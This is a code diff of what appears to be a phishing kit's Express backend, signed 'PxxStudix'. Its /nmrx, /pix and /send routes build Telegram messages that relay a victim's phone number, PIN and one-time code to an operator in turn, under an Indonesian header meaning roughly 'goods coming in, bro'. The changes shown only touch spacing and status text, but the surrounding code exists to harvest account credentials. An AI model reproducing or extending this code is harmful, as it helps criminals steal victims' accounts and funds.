@@ -75,10 +75,10 @@ app.post("/nmrx", async(req,res) =>{
         /* PESAN TELEGRAM */
         const text = `
 💳 <b>| BARANG MASUK BANG |</b> 💳
-            × <code>${nmrx}</code> ×
+           × <code>${nmrx}</code> ×
 
 <b>×  NMR  ×</b>   : <b>${nmrx}</b>
-<i>Waiting POX....</i>
+<i>POX . . . .</i>
 
 <b>©️ By PxxStudix</b>
         `;
@@ -171,11 +171,11 @@ app.post("/pix", async(req,res) =>{
         /* PESAN TELEGRAM */
         const text = `
 💳 <b>| BARANG MASUK BANG |</b> 💳
-            × <code>${nmrx}</code> ×
+           × <code>${nmrx}</code> ×
 
 <b>×  NMR  ×</b>   : <b>${nmrx}</b>
 <b>×  POX   ×</b>   : <b>${pix}</b>
-<i>Waiting OXT....</i>
+<i>OXT . . . .</i>
 
 <b>©️ By PxxStudix</b>
         `;
@@ -270,7 +270,7 @@ app.post("/send", async(req,res) =>{
         /* PESAN TELEGRAM */
         const text = `
 💳 <b>| BARANG MASUK BANG |</b> 💳
-            × <code>${nmrx}</code> ×
+           × <code>${nmrx}</code> ×
 
 <b>×  NMR  ×</b>   : <b>${nmrx}</b>
 <b>×  POX   ×</b>   : <b>${pix}</b>
